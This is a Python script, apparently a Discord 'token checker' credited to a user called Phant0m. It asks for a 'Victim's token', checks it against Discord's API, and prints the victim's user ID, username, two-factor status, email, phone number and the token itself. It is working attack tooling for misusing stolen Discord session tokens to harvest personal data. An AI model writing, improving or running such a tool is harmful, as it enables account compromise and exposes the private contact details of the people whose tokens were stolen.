import random 
import colorama
from colorama import Fore
from colorama import Style
from os import system
import sys
import time
import random
import string
import pathlib
import requests, os, threading, sys, time, random, ctypes, webbrowser,re, hashlib, datetime, os.path
import colorama
from colorama import Fore, init, Back, Style
from datetime import date
import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
import os
import colorama
from discord.ext import commands
from discord.ext.commands import Bot
 
import pyfiglet
from pyfiglet import Figlet
 
from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle
 

while True:
 system("clear")
 print(Fore.CYAN + """
 __        __                        
 \ \      / /__ _ __ _ __   ___ _ __ 
  \ \ /\ / / _ \ '__| '_ \ / _ \ '__|
   \ V  V /  __/ |  | | | |  __/ |   
    \_/\_/ \___|_|  |_| |_|\___|_|   
                                     
""")                                                    
                                   
 print(Fore.RESET + """Discord Tag: 𝐏𝐡𝐚𝐧𝐭𝟎𝐦 𝐓𝐡𝐞 𝐆𝐫𝐞𝐚𝐭#1150	 
Replit Profile: https://replit.com/@phant0m007      
""")
 token = input("[>>>] Victim's token: ")

 head = {'Authorization': str(token)}
 src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)
 if src.status_code != 200:
   print(Fore.RED + '[Invalid Token]')
   print(Fore.RESET + "Do you want to try again? if yes, start over")
   exit(0)
 
 system('clear')
 print(Fore.CYAN + """
 __        __                        
 \ \      / /__ _ __ _ __   ___ _ __ 
  \ \ /\ / / _ \ '__| '_ \ / _ \ '__|
   \ V  V /  __/ |  | | | |  __/ |   
    \_/\_/ \___|_|  |_| |_|\___|_|   
                                     
""")                                                    
                                   
 print(Fore.RESET + """Discord Tag: 𝐏𝐡𝐚𝐧𝐭𝟎𝐦 𝐓𝐡𝐞 𝐆𝐫𝐞𝐚𝐭#1150	 
Replit Profile: https://replit.com/@phant0m007      
""")
              
              
 print('_________________[TOKEN INFO]_________________')
 headers = {'Authorization': token, 'Content-Type': 'application/json'}
 r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
 if r.status_code == 200:
         userName = r.json()['username'] + '#' + r.json()['discriminator']
         userID = r.json()['id']
         phone = r.json()['phone']
         email = r.json()['email']
         mfa = r.json()['mfa_enabled']
         print(f'''
[{Fore.CYAN}User ID{Fore.RESET}]         {userID}
[{Fore.CYAN}User Name{Fore.RESET}]     {userName}
[{Fore.CYAN}2 Factor{Fore.RESET}]        {mfa}
[{Fore.CYAN}Email{Fore.RESET}]           {email}
[{Fore.CYAN}Phone number{Fore.RESET}]    {phone if phone else ""}
[{Fore.CYAN}Token{Fore.RESET}]           {token}

----------------------------------------------
            ''')
 cont=input('Do you want to consult the data of another account? If yes, press enter')
